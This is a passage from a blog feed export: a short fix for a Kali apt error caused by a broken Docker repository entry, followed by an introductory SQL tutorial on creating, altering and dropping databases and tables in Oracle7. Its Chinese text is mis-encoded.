<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">root<span class="keyword">@root</span>:~# sudo apt <span class="attribute">update</span> å‘½ä¸­:<span class="number">1</span> <span class="attribute">http</span>://mirrors.ustc.edu.cn/kali kali-rolling InRelease å¿½ç•¥:<span class="number">2</span> <span class="attribute">https</span>://download.docker.com/linux/debian kali-rolling InRelease é”™è¯¯:<span class="number">3</span> <span class="attribute">https</span>://download.docker.com/linux/debian kali-rolling Release  <span class="number">404</span>  <span class="keyword">Not</span> Found [<span class="attribute">IP</span>: <span class="number">65.8</span>.<span class="number">85.83</span> <span class="number">443</span>] æ­£åœ¨è¯»å–è½¯ä»¶åŒ…åˆ—è¡¨... å®Œæˆ <span class="attribute">E</span>: ä»“åº“ â€œ<span class="attribute">https</span>://download.docker.com/linux/debian kali-rolling Releaseâ€ æ²¡æœ‰ Release æ–‡ä»¶ã€‚ <span class="attribute">N</span>: æ— æ³•å®‰å…¨åœ°ç”¨è¯¥æºè¿›è¡Œæ›´æ–°ï¼Œæ‰€ä»¥é»˜è®¤ç¦ç”¨è¯¥æºã€‚ <span class="attribute">N</span>: å‚è§ apt-secure(<span class="number">8</span>) æ‰‹å†Œä»¥äº†è§£ä»“åº“åˆ›å»ºå’Œç”¨æˆ·é…ç½®æ–¹é¢çš„ç»†èŠ‚ã€‚</span><br></pre></td></tr></table></figure>
<h4 id="è§£å†³åŠæ³•"><a class="markdownIt-Anchor" href="#è§£å†³åŠæ³•"></a> è§£å†³åŠæ³•</h4>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@root</span><span class="symbol">:~</span><span class="comment"># cd /etc/apt/sources.list.d</span></span><br><span class="line">root<span class="variable">@root</span><span class="symbol">:/etc/apt/sources</span>.list.d<span class="comment"># ls</span></span><br><span class="line">docker.list</span><br><span class="line">root<span class="variable">@root</span><span class="symbol">:/etc/apt/sources</span>.list.d<span class="comment"># rm docker.list </span></span><br><span class="line">root<span class="variable">@root</span><span class="symbol">:/etc/apt/sources</span>.list.d<span class="comment"># apt-get update &amp;&amp; apt-get upgrade</span></span><br></pre></td></tr></table></figure>
<p>å¥½è€¶æ•£èŠ±ï¼QWQ</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-å¢åˆ æ”¹æŸ¥</title>
    <url>/2022/09/SQL-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<p>Do u know Create and Drop Database, Create, Alter and Drop Tables, Select, Insert, Update, Delete Commands.</p>
<span id="more"></span>
<h2 id="introduction-descriptive"><a class="markdownIt-Anchor" href="#introduction-descriptive"></a> Introduction (Descriptive)</h2>
<p>Content:- Creating and Maintaining Tables, Objectives, The CREATE DATABASE Statement, CREATE DATABASE Options, Database Design, Creating a Data Dictionary, Creating Key Fields, The CREATE TABLE Statement, The Table Name, The Field Name, The Fieldâ€™s Data Type, The NULL Value, Table Storage and Sizing, Creating a Table from an Existing Table, The ALTER TABLE Statement, The DROP TABLE Statement, The DROP DATABASE Statement.</p>
<h2 id="details"><a class="markdownIt-Anchor" href="#details"></a> Details</h2>
<p>It covers the <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong> statements, which are collectively known as data definition statements. (In contrast, the <strong>SELECT</strong>, <strong>UPDATE</strong>, <strong>INSERT</strong>, and <strong>DELETE</strong> statements are often described as data manipulation statements.) By the end, you will understand and be able to do the following:</p>
<ul>
<li>Create key fields</li>
<li>Create a database with its associated tables</li>
<li>Create, alter, and drop a table</li>
<li>Add data to the database</li>
<li>Modify the data in a database</li>
<li>Drop databases</li>
</ul>
<p>The syntax of the <strong>CREATE</strong> statements can range from the extremely simple to the complex, depending on the options your database management system (DBMS) supports and how detailed you want to be when building a database.</p>
<p><strong>NOTE:</strong> The examples used today were generated using Personal Oracle7. Please see the documentation for your specific SQL implementation for any minor differences in syntax.</p>
<h2 id="the-create-database-statement"><a class="markdownIt-Anchor" href="#the-create-database-statement"></a> <strong>The CREATE DATABASE Statement</strong></h2>
<p>The first data management step in any database project is to create the database. This task can range from the elementary to the complicated, depending on your needs and the database management system you have chosen. Many modern systems (including Personal Oracle7) include graphical tools that enable you to completely build the database with the click of a mouse button. This time-saving feature is certainly helpful, but you should understand the SQL statements that execute in response to the mouse clicks.</p>
<p>Through personal experience, we have learned the importance of creating a good SQL install script. This script file contains the necessary SQL code to completely rebuild a database or databases; the script often includes database objects such as indexes, stored procedures, and triggers. You will see the value of this script during development as you continually make changes to the underlying database and on occasion want to completely rebuild the database with all the latest changes. Using the graphical tools each time you need to perform a rebuild can become extremely time-consuming. In addition, knowing the SQL syntax for this procedure enables you to apply your knowledge to other database systems.</p>
<p>The syntax for the typical <strong>CREATE DATABASE</strong> statement looks like this:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE DATABASE database_name</p>
<p>Because the syntax varies so widely from system to system, we will not expand on the <strong>CREATE DATABASE</strong> statementâ€™s syntax. Many systems do not even support an SQL <strong>CREATE DATABASE</strong> command. However, all the popular, more powerful, relational database management systems (RDBMSs) do provide it. Instead of focusing on its syntax, we will spend some time discussing the options to consider when creating a database.</p>
<h2 id="create-database-options"><a class="markdownIt-Anchor" href="#create-database-options"></a> <strong>CREATE DATABASE Options</strong></h2>
<p>The syntax for the <strong>CREATE DATABASE</strong> statement can vary widely. Many SQL texts skip over the <strong>CREATE DATABASE</strong> statement and move directly on to the <strong>CREATE TABLE</strong> statement. Because you must create a database before you can build a table, this section focuses on some of the concepts a developer must consider when building a database. The first consideration is your level of permission. If you are using a relational database management system (RDBMS) that supports user permissions, you must make sure that either you have system administrator-level permission settings or the system administrator has granted you <strong>CREATE DATABASE</strong> permission. Refer to your RDBMS documentation for more information.</p>
<p>Most RDBMSs also allow you to specify a default database size, usually in terms of hard disk space (such as megabytes). You will need to understand how your database system stores and locates data on the disk to accurately estimate the size you need. The responsibility for managing this space falls primarily to system administrators, and possibly at your location a database administrator will build you a test database.</p>
<p>Donâ€™t let the <strong>CREATE DATABASE</strong> statement intimidate you. At its simplest, you can create a database named <strong>PAYMENTS</strong> with the following statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>SQL&gt; <strong>CREATE DATABASE PAYMENTS;</strong></p>
<p><strong>NOTE:</strong> Again, be sure to consult your database management systemâ€™s documentation to learn the specifics of building a database, as the <strong>CREATE DATABASE</strong> statement can and does vary for the different implementations. Each implementation also has some unique options.</p>
<p><strong>Database Design</strong></p>
<p><em>Normalization</em> is the process of breaking your data into separate components to reduce the repetition of data. Each level of normalization reduces the repetition of data. Normalizing your data can be an extremely complex process, and numerous database design tools enable you to plan this process in a logical fashion. Many factors can influence the design of your database, including the following:</p>
<p><strong>Security</strong></p>
<ul>
<li>Disk space available</li>
<li>Speed of database searches and retrievals</li>
<li>Speed of database updates</li>
<li>Speed of multiple-table joins to retrieve data</li>
<li>RDBMS support for temporary tables</li>
</ul>
<p>Disk space is always an important factor. Although you may not think that disk space is a major concern in an age of multigigabyte storage, remember that the bigger your database is, the longer it takes to retrieve records. If you have done a poor job of designing your table structure, chances are that you have needlessly repeated much of your data.</p>
<p>Often the opposite problem can occur. You may have sought to completely normalize your tablesâ€™ design with the database and in doing so created many tables. Although you may have approached database-design nirvana, any query operations done against this database may take a very long time to execute. Databases designed in this manner are sometimes difficult to maintain because the table structure might obscure the designerâ€™s intent. This problem underlines the importance of always documenting your code or design so that others can come in after you (or work with you) and have some idea of what you were thinking at the time you created your database structure. In database designerâ€™s terms, this documentation is known as a data dictionary.</p>
<h2 id="creating-a-data-dictionary"><a class="markdownIt-Anchor" href="#creating-a-data-dictionary"></a> <strong>Creating a Data Dictionary</strong></h2>
<p>A data dictionary is the database designerâ€™s most important form of documentation. It performs the following functions:</p>
<ul>
<li>Describes the purpose of the database and who will be using it.</li>
<li>Documents the specifics behind the database itself: what device it was created on, the databaseâ€™s default size, or the size of the log file (used to store database operations information in some RDBMSs).</li>
<li>Contains SQL source code for any database install or uninstall scripts, including documentation on the use of import/export tools.</li>
<li>Provides a detailed description of each table within the database and explains its purpose in business process terminology.</li>
<li>Documents the internal structure of each table, including all fields and their data types with comments, all indexes, and all views.</li>
<li>Contains SQL source code for all stored procedures and triggers.</li>
<li>Describes database constraints such as the use of unique values or <strong>NOT NULL</strong> values. The documentation should also mention whether these constraints are enforced at the RDBMS level or whether the database programmer is expected to check for these constraints within the source code.</li>
</ul>
<p>Many computer-aided software engineering (CASE) tools aid the database designer in the creation of this data dictionary. For instance, Microsoft Access comes prepackaged with a database documenting tool that prints out a detailed description of every object in the database.</p>
<p><strong>NOTE:</strong> Most of the major RDBMS packages come with either the data dictionary installed or scripts to install it.</p>
<h2 id="creating-key-fields"><a class="markdownIt-Anchor" href="#creating-key-fields"></a> <strong>Creating Key Fields</strong></h2>
<p>Along with documenting your database design, the most important design goal you should have is to create your table structure so that each table has a primary key and a foreign key. The primary key should meet the following goals:</p>
<ul>
<li>Each record is unique within a table (no other record within the table has all of its columns equal to any other).</li>
<li>For a record to be unique, all the columns are necessary; that is, data in one column should not be repeated anywhere else in the table.</li>
</ul>
<p>Regarding the second goal, the column that has completely unique data throughout the table is known as the <em>primary key field</em>. A <em>foreign key field</em> is a field that links one table to another tableâ€™s primary or foreign key. The following example should clarify this situation.</p>
<p>Assume you have three tables: <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong>. Table 9.1 shows the format of these three tables.</p>
<p><strong>Table 9.1. Table structure for the PAYMENTS database.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/54613e7278674249b4a08a642a66837b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>Take a moment to examine these tables. Which fields do you think are the primary keys? Which are the foreign keys?</p>
<p>The primary key in the <strong>BILLS</strong> table is the <strong>NAME</strong> field. This field should not be duplicated because you have only one bill with this amount. (In reality, you would probably have a check number or a date to make this record truly unique, but assume for now that the <strong>NAME</strong> field works.) The <strong>ACCOUNT_ID</strong> field in the <strong>BANK_ACCOUNTS</strong> table is the primary key for that table. The <strong>NAME</strong> field is the primary key for the <strong>COMPANY</strong> table.</p>
<p>The foreign keys in this example are probably easy to spot. The <strong>ACCOUNT_ID</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>BANK_ACCOUNTS</strong> table. The <strong>NAME</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>COMPANY</strong> table. If this were a full-fledged database design, you would have many more tables and data breakdowns. For instance, the <strong>BANK</strong> field in the <strong>BANK_ACCOUNTS</strong> table could point to a <strong>BANK</strong> table containing bank information such as addresses and phone numbers. The <strong>COMPANY</strong> table could be linked with another table (or database for that matter) containing information about the company and its products.</p>
<p><strong>Exercise 9.1</strong></p>
<p>Letâ€™s take a moment to examine an incorrect database design using the same information contained in the <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong> tables. A mistake many beginning users make is not breaking down their data into as many logical groups as possible. For instance, one poorly designed <strong>BILLS</strong> table might look like this:</p>
<p><img src="https://img-blog.csdnimg.cn/75dd3c28420b4db7af3b8291bcf7bb97.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://img-blog.csdnimg.cn/7047a6fada8f4a6ba3ea2083f2961ea8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>The results may look correct, but take a moment to really look at the data here. If over several months you wrote several bills to the company in the <strong>NAME</strong> field, each time a new record was added for a bill, the companyâ€™s <strong>ADDRESS</strong>, <strong>CITY</strong>, and <strong>STATE</strong> information would be duplicated. Now multiply that duplication over several hundred or thousand records and then multiply that figure by 10, 20, or 30 tables. You can begin to see the importance of a properly normalized database.</p>
<p>Before you actually fill these tables with data, you will need to know how to create a table.</p>
<h2 id="the-create-table-statement"><a class="markdownIt-Anchor" href="#the-create-table-statement"></a> <strong>The CREATE TABLE Statement</strong></h2>
<p>The process of creating a table is far more standardized than the <strong>CREATE DATABASE</strong> statement. Hereâ€™s the basic syntax for the <strong>CREATE TABLE</strong> statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE table_name</p>
<p>( field1 datatype [ NOT NULL ],</p>
<p>field2 datatype [ NOT NULL ],</p>
<p>field3 datatype [ NOT NULL ]â€¦)</p>
<p>A simple example of a <strong>CREATE TABLE</strong> statement follows</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30),</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement creates a table named <strong>BILLS</strong>. Within the <strong>BILLS</strong> table are three fields: <strong>NAME</strong>, <strong>AMOUNT</strong>, and <strong>ACCOUNT_ID</strong>. The <strong>NAME</strong> field has a data type of character and can store strings up to 30 characters long. The <strong>AMOUNT</strong> and <strong>ACCOUNT_ID</strong> fields can contain number values only.</p>
<p>The following section examines components of the <strong>CREATE TABLE</strong> command.</p>
<h3 id="the-table-name"><a class="markdownIt-Anchor" href="#the-table-name"></a> <strong>The Table Name</strong></h3>
<p>When creating a table using Personal Oracle7, several constraints apply when naming the table. First, the table name can be no more than 30 characters long. Because Oracle is case insensitive, you can use either uppercase or lowercase for the individual characters. However, the first character of the name must be a letter between <strong>A</strong> and <strong>Z</strong>. The remaining characters can be letters or the symbols <strong>_</strong>, <strong>#</strong>, <strong>$</strong>, and <strong>@</strong>. Of course, the table name must be unique within its schema. The name also cannot be one of the Oracle or SQL reserved words (such as <strong>SELECT</strong>).</p>
<p><strong>NOTE:</strong> You can have duplicate table names as long as the owner or schema is different. Table names in the same schema must be unique.</p>
<h3 id="the-field-name"><a class="markdownIt-Anchor" href="#the-field-name"></a> <strong>The Field Name</strong></h3>
<p>The same constraints that apply to the table name also apply to the field name. However, a field name can be duplicated within the database. The restriction is that the field name must be unique within its table. For instance, assume that you have two tables in your database: <strong>TABLE1</strong>and <strong>TABLE2</strong>. Both of these tables could have fields called ID. You cannot, however, have two fields within <strong>TABLE1</strong> called <strong>ID</strong>, even if they are of different data types.</p>
<h3 id="the-fields-data-type"><a class="markdownIt-Anchor" href="#the-fields-data-type"></a> <strong>The Fieldâ€™s Data Type</strong></h3>
<p>If you have ever programmed in any language, you are familiar with the concept of data types, or the type of data that is to be stored in a specific field. For instance, a character data type constitutes a field that stores only character string data. Table 9.2 shows the data types supported by Personal Oracle7.</p>
<p><strong>Table 9.2. Data types supported by Personal Oracle7.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/96c27bf2f8294ddd95fdbb552a7c9071.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://img-blog.csdnimg.cn/97d769dab67f44fba0b88e7a2f110dd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><strong>NOTE:</strong> The <strong>LONG</strong> data type is often called a <strong>MEMO</strong> data type in other database management systems. It is primarily used to store large amounts of text for retrieval at some later time.</p>
<p>The <strong>LONG RAW</strong> data type is often called a binary large object (<strong>BLOB</strong>) in other database management systems. It is typically used to store graphics, sound, or video data. Although relational database management systems were not originally designed to serve this type of data, many multimedia systems today store their data in <strong>LONG RAW</strong>, or <strong>BLOB</strong>, fields.</p>
<p>The <strong>ROWID</strong> field type is used to give each record within your table a unique, no duplicating value. Many other database systems support this concept with a <strong>COUNTER</strong> field (Microsoft Access) or an <strong>IDENTITY</strong> field (SQL Server).</p>
<p><strong>NOTE:</strong> Check your implementation for supported data types as they may vary.</p>
<h3 id="the-null-value"><a class="markdownIt-Anchor" href="#the-null-value"></a> <strong>The NULL Value</strong></h3>
<p>SQL also enables you to identify what can be stored within a column. A <strong>NULL</strong> value is almost an oxymoron, because having a field with a value of <strong>NULL</strong> means that the field actually has no value stored in it.</p>
<p>When building a table, most database systems enable you to denote a column with the <strong>NOT NULL</strong> keywords. <strong>NOT NULL</strong> means the column cannot contain any <strong>NULL</strong> values for any records in the table. Conversely, <strong>NOT NULL</strong> means that every record must have an actual value in this column. The following example illustrates the use of the <strong>NOT NULL</strong> keywords.</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NOT NULL);</strong></p>
<p><strong>ANALYSIS:</strong></p>
<p>In this table you want to save the name of the company you owe the money to, along with the billâ€™s amount. If the <strong>NAME</strong> field and/or the <strong>ACCOUNT_ID</strong> were not stored, the record would be meaningless. You would end up with a record with a bill, but you would have no idea whom you should pay.</p>
<p>The first statement in the next example inserts a valid record containing data for a bill to be sent to Joeâ€™s Computer Service for $25.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(â€œJoeâ€™s Computer Serviceâ€, 25, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(â€œâ€, 25000, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice that the second record in the preceding example does not contain a <strong>NAME</strong> value. (You might think that a missing payee is to your advantage because the bill amount is $25,000, but we wonâ€™t consider that.) If the table had been created with a <strong>NOT NULL</strong> value for the <strong>NAME</strong> field, the second insert would have raised an error.</p>
<p>A good rule of thumb is that the primary key field and all foreign key fields should never contain <strong>NULL</strong> values.</p>
<p><strong>Unique Fields</strong></p>
<p>One of your design goals should be to have one unique column within each table. This column or field is a primary key field. Some database management systems allow you to set a field as unique. Other database management systems, such as Oracle and SQL Server, allow you to create a unique index on a field. This feature keeps you from inserting duplicate key field values into the database.</p>
<p>You should notice several things when choosing a key field. As we mentioned, Oracle provides a <strong>ROWID</strong> field that is incremented for each row that is added, which makes this field by default always a unique key. <strong>ROWID</strong> fields make excellent key fields for several reasons. First, it is much faster to join on an integer value than on an 80- character string. Such joins result in smaller database sizes over time if you store an integer value in every primary and foreign key as opposed to a long <strong>CHAR</strong> value. Another advantage is that you can use <strong>ROWID</strong> fields to see how a table is organized. Also, using <strong>CHAR</strong> values leaves you open to a number of data entry problems. For instance, what would happen if one person entered <strong>111 First Street</strong>, another entered <strong>111 1st Street</strong>, and yet another entered <strong>111 First St.</strong>? With todayâ€™s graphical user environments, the correct string could be entered into a list box. When a user makes a selection from the list box, the code would convert this string to a unique ID and save this ID to the database.</p>
<p>Now you can create the tables you used earlier today. You will use these tables for the rest of today, so you will want to fill them with some data. Use the <strong>INSERT</strong> command covered yesterday to load the tables with the data in Tables 9.3, 9.4, and 9.5.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>create database PAYMENTS;</strong></p>
<p>Statement processed.</p>
<p>SQL&gt; <strong>create table BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER NOT NULL);</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table BANK_ACCOUNTS (</strong></p>
<p>2 <strong>ACCOUNT_ID NUMBER NOT NULL,</strong></p>
<p>3 <strong>TYPE CHAR(30),</strong></p>
<p>4 <strong>BALANCE NUMBER,</strong></p>
<p>5 <strong>BANK CHAR(30));</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table COMPANY (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>ADDRESS CHAR(50),</strong></p>
<p>4 <strong>CITY CHAR(30),</strong></p>
<p>5 <strong>STATE CHAR(2));</strong></p>
<p>Table created.</p>
<p><strong>Table 9.3. Sample data for the BILLS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0d2c47a1014d4410b1914a93640728cc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><strong>Table 9.4. Sample data for the BANK_ACCOUNTS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0e80211dce534627935aeb2437501c74.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><strong>Table 9.5. Sample data for the COMPANY table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/458ba3ffdf17401ba0fed78e6c46207f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><strong>Table Storage and Sizing</strong></p>
<p>Most major RDBMSs have default settings for table sizes and table locations. If you do not specify table size and location, then the table will take the defaults. The defaults may be very undesirable, especially for large tables. The default sizes and locations will vary among the implementations. Here is an example of a <strong>CREATE TABLE</strong> statement with a storage clause (from Oracle).</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE TABLENAME</strong></p>
<p>2 <strong>(COLUMN1 CHAR NOT NULL,</strong></p>
<p>3 <strong>COLUMN2 NUMBER,</strong></p>
<p>4 <strong>COLUMN3 DATE)</strong></p>
<p>5 <strong>TABLESPACE TABLESPACE NAME</strong></p>
<p>6 <strong>STORAGE</strong></p>
<p>7 <strong>INITIAL SIZE,</strong></p>
<p>8 <strong>NEXT SIZE,</strong></p>
<p>9 <strong>MINEXTENTS value,</strong></p>
<p>10 <strong>MAXEXTENTS value,</strong></p>
<p>11 <strong>PCTINCREASE value);</strong></p>
<p><strong>OUTPUT:</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>In Oracle you can specify a tablespace in which you want the table to reside. A decision is usually made according to the space available, often by the database administrator (DBA). <strong>INITIAL SIZE</strong> is the size for the initial extent of the table (the initial allocated space). <strong>NEXT SIZE</strong> is the value for any additional extents the table may take through growth. <strong>MINEXTENTS</strong> and <strong>MAXEXTENTS</strong> identify the minimum and maximum extents allowed for the table, and <strong>PCTINCREASE</strong> identifies the percentage the next extent will be increased each time the table grows, or takes another extent.</p>
<p><strong>Creating a Table from an Existing Table</strong></p>
<p>The most common way to create a table is with the <strong>CREATE TABLE</strong> command. However, some database management systems provide an alternative method of creating tables, using the format and data of an existing table. This method is useful when you want to select the data out of a table for temporary modification. It can also be useful when you have to create a table similar to the existing table and fill it with similar data. (You wonâ€™t have to reenter all this information.) The syntax for Oracle follows.</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE NEW_TABLE(FIELD1, FIELD2, FIELD3)</p>
<p>AS (SELECT FIELD1, FIELD2, FIELD3</p>
<p>FROM OLD_TABLE &lt;WHEREâ€¦&gt;</p>
<p>This syntax allows you to create a new table with the same data types as those of the fields that are selected from the old table. It also allows you to rename the fields in the new table by giving them new names.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE NEW_BILLS(NAME, AMOUNT, ACCOUNT_ID)</strong></p>
<p>2 <strong>AS (SELECT * FROM BILLS WHERE AMOUNT &lt; 50);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>The preceding statement creates a new table (<strong>NEW_BILLS</strong>) with all the records from the <strong>BILLS</strong> table that have an <strong>AMOUNT</strong> less than <strong>50</strong>.</p>
<p>Some database systems also allow you to use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>INSERT NEW_TABLE</p>
<p>SELECT &lt;field1, field2â€¦ | *&gt; from OLD_TABLE</p>
<p>&lt;WHEREâ€¦&gt;</p>
<p>The preceding syntax would create a new table with the exact field structure and data found in the old table. Using SQL Serverâ€™s Transact-SQL language in the following example illustrates this technique.</p>
<p><strong>INPUT:</strong></p>
<p><strong>INSERT NEW_BILLS</strong></p>
<p>1&gt; <strong>select * from BILLS where AMOUNT &lt; 50</strong></p>
<p>2&gt; <strong>go</strong></p>
<p>(The <strong>GO</strong> statement in SQL Server processes the SQL statements in the command buffer. It is equivalent to the semicolon (<strong>;</strong>) used in Oracle7.)</p>
<p><strong>The ALTER TABLE Statement</strong></p>
<p>Many times your database design does not account for everything it should. Also, requirements for applications and databases are always subject to change. The <strong>ALTER TABLE</strong> statement enables the database administrator or designer to change the structure of a table after it has been created.</p>
<p>The <strong>ALTER TABLE</strong> command enables you to do two things:</p>
<ul>
<li>Add a column to an existing table</li>
<li>Modify a column that already exists</li>
</ul>
<p>The syntax for the <strong>ALTER TABLE</strong> statement is as follows:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name</p>
<p>&lt;ADD column_name data_type; |</p>
<p>MODIFY column_name data_type;&gt;</p>
<p>The following command changes the <strong>NAME</strong> field of the <strong>BILLS</strong> table to hold 40</p>
<p>characters:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE BILLS</strong></p>
<p>2 <strong>MODIFY NAME CHAR(40);</strong></p>
<p>Table altered.</p>
<p><strong>NOTE:</strong> You can increase or decrease the length of columns; however, you can not decrease a columnâ€™s length if the current size of one of its values is greater than the value you want to assign to the column length.</p>
<p>Hereâ€™s a statement to add a new column to the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE NEW_BILLS</strong></p>
<p>2 <strong>ADD COMMENTS CHAR(80);</strong></p>
<p>Table altered.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement would add a new column named <strong>COMMENTS</strong> capable of holding 80 characters. The field would be added to the right of all the existing fields.</p>
<p>Several restrictions apply to using the <strong>ALTER TABLE</strong> statement. You cannot use it to add or delete fields from a database. It can change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, but not necessarily the other way around. A column specification can be changed from <strong>NULL</strong> to <strong>NOT NULL</strong> only if the column does not contain any <strong>NULL</strong> values. To change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name MODIFY (column_name data_type NULL);</p>
<p>To change a column from <strong>NULL</strong> to <strong>NOT NULL</strong>, you might have to take several steps:</p>
<p><strong>1.</strong> Determine whether the column has any <strong>NULL</strong> values.</p>
<p><strong>2.</strong> Deal with any <strong>NULL</strong> values that you find. (Delete those records; update the columnâ€™s value, and so on.)</p>
<p><strong>3.</strong> Issue the <strong>ALTER TABLE</strong> command.</p>
<p><strong>NOTE:</strong> Some database management systems allow the use of the <strong>MODIFY</strong> Clause; others do not. Still others have added other clauses to the <strong>ALTER TABLE</strong> statement. In Oracle, you can even alter the tableâ€™s storage parameters. Check the documentation of the system you are using to determine the implementation of the <strong>ALTER TABLE</strong> statement.</p>
<p><strong>The DROP TABLE Statement</strong></p>
<p>SQL provides a command to completely remove a table from a database. The <strong>DROP TABLE</strong> command deletes a table along with all its associated views and indexes. After this command has been issued, there is no turning back. The most common use of the <strong>DROP TABLE</strong> statement is when you have created a table for temporary use. When you have completed all operations on the table that you planned to do, issue the <strong>DROP TABLE</strong> statement with the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>DROP TABLE table_name;</p>
<p>Hereâ€™s how to drop the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>DROP TABLE NEW_BILLS;</strong></p>
<p>Table dropped.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice the absence of system prompts. This command did not ask <strong>Are you sure? (Y/N)</strong>. After the <strong>DROP TABLE</strong> command is issued, the table is permanently deleted.</p>
<p><strong>WARNING:</strong> If you issue</p>
<p>SQL&gt; DROP TABLE NEW_BILLS;</p>
<p>you could be dropping the incorrect table. When dropping tables, you should always use the owner or schema name. The recommended syntax is</p>
<p>SQL&gt; DROP TABLE OWNER.NEW_BILLS;</p>
<p>We are stressing this syntax because we once had to repair a production database from which the wrong table had been dropped. The table was not properly identified with the schema name. Restoring the database was an eight-hour job, and we had to work until well past midnight.</p>
<p><strong>The DROP DATABASE Statement</strong></p>
<p>Some database management systems also provide the <strong>DROP DATABASE</strong> statement, which is identical in usage to the <strong>DROP TABLE</strong> statement. The syntax for this statement is as follows:</p>
<p>DROP DATABASE database_name</p>
